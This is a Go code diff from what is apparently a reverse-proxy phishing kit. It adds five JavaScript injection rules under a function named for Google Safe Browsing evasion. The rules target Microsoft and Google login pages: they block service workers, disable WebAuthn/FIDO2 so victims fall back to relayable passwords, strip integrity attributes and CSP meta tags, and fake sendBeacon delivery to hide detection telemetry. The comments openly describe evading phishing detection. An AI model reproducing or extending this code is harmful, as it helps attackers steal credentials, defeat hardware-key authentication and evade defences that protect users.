@@ -629,6 +629,237 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			ScriptType: "inline",
 			Enabled:    true,
 		},
+
+		// 13. Service Worker Registration Blocker
+		// Service workers are a common browser-side phishing detection path —
+		// a target can register a worker that intercepts every request and
+		// reports anomalies back to its own backend. Refusing registration at
+		// the API level (Promise.reject) is a DOM-free shim: no MSAL guard
+		// needed because none of the login flows legitimately install a worker.
+		{
+			ID:   "builtin_service_worker_blocker",
+			Name: "Service Worker Registration Blocker",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  try {
+    if (navigator.serviceWorker) {
+      navigator.serviceWorker.register = function() {
+        return Promise.reject(new Error('not supported'));
+      };
+    }
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 14. WebAuthn / FIDO2 Disabler
+		// Hardware-key / platform-authenticator challenges cannot be relayed
+		// through the reverse proxy (the cryptographic origin binding is tied
+		// to the real domain), so if the target page falls through to WebAuthn
+		// the whole session breaks. This rule neutralises the API surface so
+		// the page falls back to password auth. API-shim only — no MSAL guard.
+		{
+			ID:   "builtin_webauthn_disabler",
+			Name: "WebAuthn / FIDO2 Disabler",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  try {
+    if (window.PublicKeyCredential) {
+      Object.defineProperty(window, 'PublicKeyCredential', {
+        value: undefined,
+        configurable: false
+      });
+    }
+  } catch(e) {}
+  try {
+    if (navigator.credentials) {
+      navigator.credentials.create = function() {
+        return Promise.reject(new DOMException('NotAllowed'));
+      };
+    }
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 15. Subresource Integrity (integrity=) Attribute Stripper
+		// Proxy-rewritten assets have modified bytes, so the hash in the
+		// source page's `integrity=` attribute no longer matches and the
+		// browser refuses to execute the script/style. A MutationObserver
+		// strips the attribute on added <script>/<link> nodes.
+		//
+		// MSAL guard: on AAD we specifically DO want real SRI failure to
+		// surface, because the AAD CDN serves its own integrity-hashed
+		// bundle and the proxy passes it through unmodified — a SRI
+		// mismatch there means something else is wrong and silencing it
+		// would mask real bugs.
+		{
+			ID:   "builtin_integrity_attr_stripper",
+			Name: "Subresource Integrity Attribute Stripper",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  try {
+    // Strip integrity on anything already in the tree at script-run time.
+    document.querySelectorAll('script[integrity],link[integrity]').forEach(function(el) {
+      try { el.removeAttribute('integrity'); } catch(e) {}
+    });
+  } catch(e) {}
+
+  try {
+    var _obs = new MutationObserver(function(mutations) {
+      mutations.forEach(function(m) {
+        m.addedNodes.forEach(function(node) {
+          try {
+            if (node && node.nodeType === 1) {
+              var tag = node.tagName;
+              if (tag === 'SCRIPT' || tag === 'LINK') {
+                if (node.hasAttribute && node.hasAttribute('integrity')) {
+                  node.removeAttribute('integrity');
+                }
+              }
+            }
+          } catch(e) {}
+        });
+      });
+    });
+    _obs.observe(document.documentElement, { childList: true, subtree: true });
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 16. CSP Meta Tag Neutralizer
+		// The proxy can't always satisfy strict Content-Security-Policy
+		// directives emitted as <meta http-equiv="Content-Security-Policy">
+		// by the upstream page — rewritten asset origins violate `default-src`
+		// etc. Server-side scrubbing (v1.0.66 layer 4) removes the response
+		// *header*; this rule removes runtime-injected meta tags.
+		//
+		// MSAL guard: AAD's own CSP meta is essential to the login flow
+		// (it sets worker-src/script-src/connect-src that MSAL's bootstrap
+		// depends on). Skip on MSAL.
+		{
+			ID:   "builtin_csp_meta_neutralizer",
+			Name: "CSP Meta Tag Neutralizer",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  function _isCSPMeta(node) {
+    try {
+      if (!node || node.tagName !== 'META') return false;
+      var eq = (node.getAttribute('http-equiv') || '').toLowerCase();
+      return eq === 'content-security-policy' || eq === 'content-security-policy-report-only';
+    } catch(e) { return false; }
+  }
+
+  try {
+    // Strip existing CSP meta tags already parsed into the tree.
+    var head = document.head || document.documentElement;
+    if (head) {
+      head.querySelectorAll('meta[http-equiv]').forEach(function(m) {
+        if (_isCSPMeta(m)) {
+          try { m.remove(); } catch(e) {}
+        }
+      });
+    }
+  } catch(e) {}
+
+  try {
+    var _obs = new MutationObserver(function(mutations) {
+      mutations.forEach(function(m) {
+        m.addedNodes.forEach(function(node) {
+          if (_isCSPMeta(node)) {
+            try { node.remove(); } catch(e) {}
+          }
+        });
+      });
+    });
+    _obs.observe(document.documentElement, { childList: true, subtree: true });
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 17. sendBeacon Blocker (global)
+		// Many analytics / telemetry / phishing-detection pipelines ride on
+		// navigator.sendBeacon() because the browser guarantees delivery on
+		// page unload. Blocking ALL beacons (not just GSB-targeted ones as in
+		// rule 12) stops every unload-time telemetry leak. Returning `true`
+		// makes the caller believe the beacon was queued.
+		//
+		// No MSAL guard (API shim only, no DOM access). AAD does not depend
+		// on sendBeacon for its login flow.
+		{
+			ID:   "builtin_sendbeacon_blocker",
+			Name: "sendBeacon Global Blocker",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  try {
+    if (navigator && typeof navigator.sendBeacon === 'function') {
+      navigator.sendBeacon = function() { return true; };
+    }
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
 	}
 }
 
